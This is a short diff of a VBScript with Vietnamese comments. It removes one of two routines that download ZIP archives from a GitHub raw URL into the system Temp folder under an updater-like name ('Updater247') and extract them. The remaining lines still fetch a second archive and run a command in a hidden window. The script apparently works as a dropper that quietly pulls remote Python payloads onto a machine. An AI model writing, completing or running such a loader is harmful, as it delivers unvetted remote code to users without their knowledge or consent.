@@ -1,4 +1,4 @@
-Dim http, url1, url2, tempFolder, zip1, zip2
+Dim http, url2, tempFolder, zip1, zip2
 Dim shell, fso, stream, txtPath, scriptName
 
 
@@ -22,7 +22,6 @@ shell.Run cmd1, 0, True
 
 ' URL của các file ZIP
 
-url1 = "https://raw.githubusercontent.com/f68g/us/refs/heads/main/pyv1.zip"
 url2 = "https://raw.githubusercontent.com/f68g/us/refs/heads/main/pyv2.zip"
 
 ' Lấy thư mục Temp thật của hệ thống
@@ -73,13 +72,6 @@ Sub ExtractZip(zipPath, targetFolder)
     Else
     End If
 End Sub
-
-' =============================
-' Xử lý PyEnv1.zip
-zip1 = tempFolder & "Updater247.zip"
-If DownloadFile(url1, zip1) Then
-    ExtractZip zip1, tempFolder & "Updater247"
-End If
 
 ' =============================
 ' Xử lý PyEnv2.zip
